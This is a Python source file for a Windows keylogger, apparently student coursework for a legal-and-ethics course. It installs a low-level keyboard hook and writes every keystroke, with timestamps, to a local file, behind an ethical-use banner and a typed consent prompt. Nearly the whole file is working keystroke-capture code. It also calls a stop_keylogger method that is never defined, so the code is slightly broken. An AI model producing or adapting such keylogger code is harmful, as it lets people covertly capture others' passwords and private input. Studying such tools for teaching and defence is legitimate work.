import os
import datetime
import logging
import sys
import threading
import time

# Windows-specific imports
try:
    import msvcrt
    import ctypes
    from ctypes import wintypes
    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False
    print("This version requires Windows. Install pynput for cross-platform support.")

class EducationalKeylogger:
    def __init__(self, log_file_path=None):
        """Initialize the keylogger with ethical warnings and setup."""
        if not WINDOWS_AVAILABLE:
            print("Error: This version requires Windows or install pynput library.")
            sys.exit(1)
        
        self.display_ethical_warning()
        self.running = False
        
        if log_file_path is None:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            self.log_file_path = f"keylog_educational_{timestamp}.txt"
        else:
            self.log_file_path = log_file_path
            
        self.setup_logging()
        self.setup_windows_hooks()
    
    def display_ethical_warning(self):
        """Display important ethical and legal warnings."""
        print("\n" + "="*60)
        print("ETHICAL KEYLOGGER - EDUCATIONAL PURPOSE ONLY")
        print("="*60)
        print("WARNING: This tool is for cybersecurity education only!")
        print("- Only use on systems you own")
        print("- Obtain explicit written consent before monitoring others")
        print("- Follow all applicable laws and regulations")
        print("- Do not use for malicious purposes")
        print("- Violation may result in legal consequences")
        print("="*60)
        
        consent = input("\nDo you confirm ethical use? (yes/no): ").strip().lower()
        if consent != 'yes':
            print("Ethical consent not provided. Exiting...")
            sys.exit(1)
    
    def setup_logging(self):
        """Setup logging configuration."""
        logging.basicConfig(
            filename=f"keylogger_system_{datetime.datetime.now().strftime('%Y%m%d')}.log",
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s'
        )
        logging.info("Educational keylogger initialized")
    
    def create_log_file(self):
        """Create or clear the log file with proper error handling."""
        try:
            with open(self.log_file_path, 'w') as f:
                f.write(f"Educational Keylogger Session Started: {datetime.datetime.now()}\n")
                f.write("="*50 + "\n")
            print(f"Log file created: {self.log_file_path}")
            logging.info(f"Log file created: {self.log_file_path}")
        except PermissionError:
            print("Error: Permission denied. Check file permissions.")
            logging.error("Permission denied when creating log file")
            sys.exit(1)
        except Exception as e:
            print(f"Error creating log file: {e}")
            logging.error(f"Error creating log file: {e}")
            sys.exit(1)
    
    def setup_windows_hooks(self):
        """Setup Windows-specific keyboard hooks."""
        if not WINDOWS_AVAILABLE:
            return
        
        # Windows API constants
        self.WH_KEYBOARD_LL = 13
        self.WM_KEYDOWN = 0x0100
        self.HC_ACTION = 0
        
        # Load Windows DLLs
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        self.user32 = ctypes.WinDLL('user32', use_last_error=True)
        
        # Define hook procedure type
        self.HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
    
    def low_level_keyboard_proc(self, nCode, wParam, lParam):
        """Low-level keyboard hook procedure."""
        if nCode >= self.HC_ACTION:
            if wParam == self.WM_KEYDOWN:
                # Get virtual key code
                vk_code = ctypes.cast(lParam, ctypes.POINTER(ctypes.c_ulong)).contents.value & 0xFFFFFFFF
                
                # Convert to character
                self.log_key(vk_code)
                
                # Check for ESC key (VK_ESCAPE = 27)
                if vk_code == 27:
                    self.running = False
                    return 1
        
        # Call next hook
        return self.user32.CallNextHookExW(None, nCode, wParam, lParam)
    
    def log_key(self, vk_code):
        """Log the pressed key."""
        try:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Map common virtual key codes to characters
            key_map = {
                8: '[BACKSPACE]', 9: '[TAB]', 13: '[ENTER]', 16: '[SHIFT]',
                17: '[CTRL]', 18: '[ALT]', 20: '[CAPS]', 27: '[ESC]',
                32: ' ', 46: '[DELETE]', 37: '[LEFT]', 38: '[UP]',
                39: '[RIGHT]', 40: '[DOWN]'
            }
            
            if vk_code in key_map:
                key_str = key_map[vk_code]
            elif 65 <= vk_code <= 90:  # A-Z
                key_str = chr(vk_code).lower()
            elif 48 <= vk_code <= 57:  # 0-9
                key_str = chr(vk_code)
            else:
                key_str = f'[VK_{vk_code}]'
            
            with open(self.log_file_path, 'a', encoding='utf-8') as f:
                if key_str in ['[ENTER]', '[TAB]']:
                    f.write(f'{key_str} ({timestamp})\n')
                else:
                    f.write(key_str)
                    
        except Exception as e:
            logging.error(f"Error logging key: {e}")
    
    def start_monitoring(self):
        """Start the keylogger using Windows hooks."""
        if not WINDOWS_AVAILABLE:
            print("Windows API not available.")
            return
        
        print(f"\nStarting educational keylogger...")
        print(f"Log file: {self.log_file_path}")
        print("Press [ESC] to stop monitoring")
        print("-" * 40)
        
        # Create the log file
        self.create_log_file()
        self.running = True
        
        try:
            # Create hook procedure
            hook_proc = self.HOOKPROC(self.low_level_keyboard_proc)
            
            # Install hook
            hook_id = self.user32.SetWindowsHookExW(
                self.WH_KEYBOARD_LL,
                hook_proc,
                self.kernel32.GetModuleHandleW(None),
                0
            )
            
            if not hook_id:
                print("Failed to install keyboard hook.")
                return
            
            # Message loop
            msg = wintypes.MSG()
            while self.running:
                bRet = self.user32.GetMessageW(ctypes.byref(msg), None, 0, 0)
                if bRet == 0 or bRet == -1:
                    break
                self.user32.TranslateMessage(ctypes.byref(msg))
                self.user32.DispatchMessageW(ctypes.byref(msg))
            
            # Unhook
            self.user32.UnhookWindowsHookEx(hook_id)
            self.stop_keylogger()
            
        except Exception as e:
            print(f"Error starting keylogger: {e}")
            logging.error(f"Error starting keylogger: {e}")
    
    def analyze_logs(self):
        """Basic log analysis for educational purposes."""
        try:
            if not os.path.exists(self.log_file_path):
                print("No log file found to analyze.")
                return
            
            with open(self.log_file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Basic statistics
            char_count = len([c for c in content if c.isalnum()])
            special_keys = content.count('[')
            
            print(f"\n--- Log Analysis ---")
            print(f"Total characters logged: {char_count}")
            print(f"Special keys pressed: {special_keys}")
            print(f"Log file size: {os.path.getsize(self.log_file_path)} bytes")
            
        except Exception as e:
            print(f"Error analyzing logs: {e}")
            logging.error(f"Error analyzing logs: {e}")


def main():
    """Main function to run the educational keylogger."""
    try:
        print("Educational Keylogger for Cybersecurity Learning")
        print("Course: ST4059CEM Legal and Ethical Foundations")
        
        # Get log file path from user
        user_path = input("\nEnter log file path (or press Enter for default): ").strip()
        
        if user_path:
            keylogger = EducationalKeylogger(user_path)
        else:
            keylogger = EducationalKeylogger()
        
        # Check if log file already exists
        if os.path.exists(keylogger.log_file_path):
            overwrite = input(f"Log file exists. Overwrite? (yes/no): ").strip().lower()
            if overwrite != 'yes':
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                keylogger.log_file_path = f"keylog_educational_{timestamp}.txt"
        
        # Start monitoring
        keylogger.start_monitoring()
        
        # Offer log analysis
        analyze = input("\nWould you like to analyze the logs? (yes/no): ").strip().lower()
        if analyze == 'yes':
            keylogger.analyze_logs()
            
    except KeyboardInterrupt:
        print("\n\nKeylogger interrupted by user (Ctrl+C)")
        logging.info("Keylogger interrupted by user")
    except Exception as e:
        print(f"\nUnexpected error: {e}")
        logging.error(f"Unexpected error: {e}")


if __name__ == "__main__":
    main()